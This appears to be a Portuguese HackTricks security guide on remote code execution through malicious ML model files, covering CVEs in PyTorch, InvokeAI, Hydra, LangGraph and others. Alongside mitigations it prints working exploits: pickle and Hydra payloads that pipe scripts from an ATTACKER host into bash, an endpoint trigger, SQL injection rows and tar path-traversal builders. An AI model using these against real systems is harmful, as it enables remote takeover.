# RCE de Modelos

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Modelos de Machine Learning geralmente são compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch etc. Esses modelos podem ser carregados nas máquinas dos desenvolvedores ou em sistemas de produção para serem utilizados. Normalmente, os modelos não deveriam conter código malicioso, mas há casos em que o modelo pode ser usado para executar código arbitrário no sistema como uma funcionalidade pretendida ou devido a uma vulnerabilidade na biblioteca de carregamento de modelos.

No momento da escrita, estes são alguns exemplos desse tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerabilidade (CVE, se disponível)**                                                    | **Vetor RCE**                                                                                                                           | **Referências**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Pickle malicioso no checkpoint do modelo leva à execução de código (contornando a proteção `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download de modelo malicioso causa execução de código; RCE por deserialização Java na API de gerenciamento                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialização insegura de checkpoint via `torch.load` **(CVE-2025-23298)**                                           | Checkpoint não confiável aciona o reducer de pickle durante `load_model_trainer_states_from_checkpoint` → execução de código no worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook de extensão MessagePack inseguro **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | A chave `filter` controlada pelo usuário injeta sintaxe SQL/JSON-path, `UNION SELECT` fabrica uma linha de checkpoint falsa e, em seguida, a deserialização `msgpack` importa e chama código Python escolhido pelo atacante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Carregar modelo a partir de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar modelo com a camada **Lambda** executa código Python arbitrário          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing de TFLite)                                                                                          | Modelo `.tflite` criado especialmente aciona overflow de inteiros → corrupção de heap (potencial RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Carregar um modelo via `joblib.load` executa pickle com o payload `__reduce__` do atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` inseguro) *disputed*                                                                              | O padrão de `numpy.load` permitia arrays de objetos com pickle – um `.npy/.npz` malicioso aciona execução de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | O caminho de external-weights do modelo ONNX pode escapar do diretório (lendo arquivos arbitrários) <br> Um tar de modelo ONNX malicioso pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (risco de design)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Um modelo com operador customizado exige o carregamento de código nativo do atacante; grafos de modelos complexos abusam da lógica para executar computações não intencionais   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usar a API de model-load com `--model-control` habilitado permite path traversal relativo para gravar arquivos (por exemplo, sobrescrever `.bashrc` para RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (múltiplos heap overflows)                                                                         | Um arquivo de modelo GGUF malformado causa heap buffer overflows no parser, permitindo a execução de código arbitrário no sistema da vítima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Um modelo HDF5 (`.h5`) malicioso com camada Lambda ainda executa código durante o carregamento (o Keras safe_mode não cobre o formato antigo – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Muitas ferramentas de ML (por exemplo, formatos de modelos baseados em pickle e Python `pickle.load`) executarão código arbitrário incorporado nos arquivos de modelo, a menos que sejam mitigadas | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadados não confiáveis passados para `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadados/configuração do modelo controlados pelo atacante definem `_target_` como um callable arbitrário (por exemplo, `builtins.exec`) → executado durante o carregamento, mesmo com formatos “seguros” (`.safetensors`, `.nemo`, `config.json` do repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Além disso, existem alguns modelos baseados em Python pickle, como os usados pelo [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar código arbitrário no sistema se não forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

### Metadados do Hydra → RCE (funciona até mesmo com safetensors)

`hydra.utils.instantiate()` importa e chama qualquer `_target_` pontuado em um objeto de configuração/metadados. Quando bibliotecas passam **metadados de modelo não confiáveis** para `instantiate()`, um atacante pode fornecer um callable e argumentos que são executados imediatamente durante o carregamento do modelo (sem necessidade de pickle).<sup>[[12]](#references)[[13]](#references)</sup>

Exemplo de payload (funciona em `model_config.yaml` do `.nemo`, `config.json` do repo ou `__metadata__` dentro de `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Pontos principais:
- Acionado antes da inicialização do modelo em `restore_from/from_pretrained` do NeMo, nos coders HuggingFace do uni2TS e nos loaders do FlexTok.
- A string block-list do Hydra pode ser contornada por caminhos de importação alternativos (por exemplo, `enum.bltns.eval`) ou por nomes resolvidos pela aplicação (por exemplo, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- O FlexTok também analisa metadados convertidos em string com `ast.literal_eval`, possibilitando DoS (esgotamento de CPU/memória) antes da chamada do Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

O `InvokeAI` é uma interface web open-source popular para Stable-Diffusion. As versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install`, que permite aos usuários baixar e carregar modelos de URLs arbitrárias.<sup>[[1]](#references)</sup>

Internamente, o endpoint eventualmente chama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido é um **PyTorch checkpoint (`*.ckpt`)**, `torch.load` executa uma **desserialização de pickle**. Como o conteúdo vem diretamente da URL controlada pelo usuário, um atacante pode inserir um objeto malicioso com um método `__reduce__` personalizado dentro do checkpoint; o método é executado **durante a desserialização**, levando à **execução remota de código (RCE)** no servidor InvokeAI.

A vulnerabilidade recebeu o identificador **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Demonstração da exploração

1. Crie um checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP sob seu controle (por exemplo, `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (nenhuma autenticação necessária):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` → o gadget `os.system` é executado e o atacante obtém code execution no contexto do processo do InvokeAI.

Exploit pronto: o módulo do **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.<sup>[[3]](#references)</sup>

#### Condições

•  InvokeAI 5.3.1-5.4.2 (flag de scan padrão **false**)
•  `/api/v2/models/install` acessível pelo atacante
•  O processo tem permissões para executar comandos shell

#### Mitigações

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` por padrão e realiza malware scanning antes da desserialização.<sup>[[2]](#references)</sup>
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Imponha allow-lists / assinaturas para as fontes dos modelos e execute o serviço com least-privilege.

> ⚠️ Lembre-se de que qualquer formato baseado em Python pickle (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserialização a partir de fontes não confiáveis.

---

Exemplo de uma mitigação ad hoc caso seja necessário manter versões antigas do InvokeAI em execução atrás de um reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via `torch.load` inseguro (CVE-2025-23298)

O Transformers4Rec da NVIDIA (parte do Merlin) expunha um loader de checkpoints inseguro que chamava diretamente `torch.load()` em paths fornecidos pelo usuário. Como `torch.load` depende do Python `pickle`, um checkpoint controlado pelo atacante pode executar código arbitrário por meio de um reducer durante a desserialização.<sup>[[5]](#references)</sup>

Path vulnerável (antes da correção): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: no Python pickle, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna um callable e argumentos. O callable é executado durante o unpickling. Se esse objeto estiver presente em um checkpoint, ele será executado antes que quaisquer weights sejam usados.

Exemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vetores de entrega e blast radius:
- checkpoints/models trojanizados compartilhados via repos, buckets ou artifact registries
- Pipelines automatizados de resume/deploy que carregam checkpoints automaticamente
- A execução ocorre dentro de workers de training/inference, geralmente com privilégios elevados (por exemplo, root em containers)

Correção: o commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) substituiu o `torch.load()` direto por um deserializer restrito e allow-listed, implementado em `transformers4rec/utils/serialization.py`. O novo loader valida tipos/campos e impede que callables arbitrários sejam invocados durante o carregamento.<sup>[[7]](#references)</sup>

Orientações defensivas específicas para checkpoints do PyTorch:
- Não faça unpickle de dados não confiáveis. Prefira formatos não executáveis, como [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX, quando possível.
- Se precisar usar a serialização do PyTorch, certifique-se de que `weights_only=True` esteja habilitado (compatível com versões mais recentes do PyTorch) ou use um unpickler customizado e allow-listed semelhante ao patch do Transformers4Rec.<sup>[[4]](#references)</sup>
- Aplique a validação de provenance/signatures do modelo e faça o sandboxing da desserialização (seccomp/AppArmor; usuário não-root; FS restrito e sem network egress).
- Monitore processos filhos inesperados originados por serviços de ML no momento do carregamento de checkpoints; rastreie o uso de `torch.load()`/`pickle`.

Referências de POC e de versões vulnerável/patch:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Loader vulnerável pré-patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader pós-patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Exemplo – criação de um modelo malicioso do PyTorch

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregue o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

O FaceDetection-DSFD da Tencent expõe um endpoint `resnet` que faz a desserialização de dados controlados pelo usuário. A ZDI confirmou que um atacante remoto pode induzir uma vítima a carregar uma página/arquivo malicioso, fazer com que ele envie um blob serializado especialmente criado para esse endpoint e acionar a desserialização como `root`, resultando em comprometimento completo.

O fluxo do exploit segue o padrão típico de abuso de pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualquer gadget acessível durante a deserialização (constructors, `__setstate__`, framework callbacks etc.) pode ser weaponized da mesma forma, independentemente de o transporte ter sido HTTP, WebSocket ou um arquivo colocado em um diretório monitorado.



### LangGraph checkpointer SQLi → MessagePack RCE

Essa attack chain é interessante porque o atacante **não precisa fazer upload de um arquivo de modelo malicioso**. Em vez disso, a aplicação expõe uma **API de persistência de AI-agent** (`get_state_history(..., filter=...)`), e a entrada do usuário chega ao query builder do checkpointer.

#### 1. SQLi estrutural em filtros de metadata

Um padrão vulnerável em SQLite era semelhante a:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
O valor é vinculado posteriormente, mas `query_key` é concatenado na **JSON path string**, portanto um `'` dentro da chave do dicionário escapa de `'$.{query_key}'` e injeta SQL. A mesma lição se aplica a **JSON paths, identificadores, operadores, `LIMIT` e campos TTL**: placeholders protegem apenas valores, não a sintaxe estrutural da query.

#### 2. `UNION SELECT` pode atingir sinks downstream, não apenas roubar dados

A query retorna `type` e bytes de `checkpoint` serializados, que são posteriormente consumidos como:
```python
self.serde.loads_typed((type, checkpoint))
```
Isso significa que uma SQLi na cláusula `WHERE` pode injetar uma **linha de resultado falsa**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Se um código posterior analisa, desserializa, grava ou executa qualquer coluna selecionada, mapeie essas colunas para seus sinks. Nesse caso, a linha falsa transforma SQLi em **desserialização controlada pelo atacante**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

O caminho `msgpack` do LangGraph usava um gancho de extensão personalizado que desempacotava uma tupla aninhada e executava:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Portanto, um objeto de extensão MessagePack que codifique algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resolve `system` e executa o comando. Ao revisar AI frameworks, inspecione **custom MessagePack/JSON/pickle revivers** em busca de dynamic imports, reflection ou arbitrary callable dispatch.

#### 4. Padrão prático de auditoria para agent frameworks

Revise qualquer input controlado pelo usuário que alcance:
- APIs de state history / memory / replay / checkpoint listing
- structured filter builders que geram fragmentos de SQL ou Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths que confiam em rows retornadas pela persistence layer

Essa cadeia específica afetou deployments self-hosted do LangGraph usando checkpointers **SQLite** ou **Redis** quando usuários não confiáveis podiam controlar `filter`. As versões corrigidas indicadas no disclosure foram `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` e `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models para Path Traversal

Conforme comentado [**neste blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de models usados por diferentes AI frameworks é baseada em archives, geralmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar ataques de path traversal, permitindo ler arquivos arbitrários do sistema onde o model é carregado.<sup>[[16]](#references)</sup>

Por exemplo, com o código a seguir, você pode criar um model que criará um arquivo no diretório `/tmp` quando for carregado:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o código a seguir, você pode criar um modelo que criará um symlink para o diretório `/tmp` quando carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análise aprofundada: desserialização de .keras do Keras e gadget hunting

Para um guia focado nos internals de .keras, RCE em Lambda-layer, o problema de importação arbitrária em ≤ 3.8 e a descoberta de gadgets após a correção dentro da allowlist, consulte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referências

- [1] [Blog da OffSec – "CVE-2024-12029 – Desserialização de dados não confiáveis no InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit de correção do InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentação do módulo do Metasploit da Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considerações de segurança para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog da ZDI – CVE-2025-23298: obtendo execução remota de código no NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Comunicado da ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit de correção do Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader vulnerável antes da correção (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malicioso (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader após a correção (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Execução remota de código com formatos e bibliotecas modernas de AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentação do Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit da block-list do Hydra (aviso sobre RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi a RCE: explorando o Checkpointer do LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Transformando bugs de Archive Slip em bounties de alto valor de AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
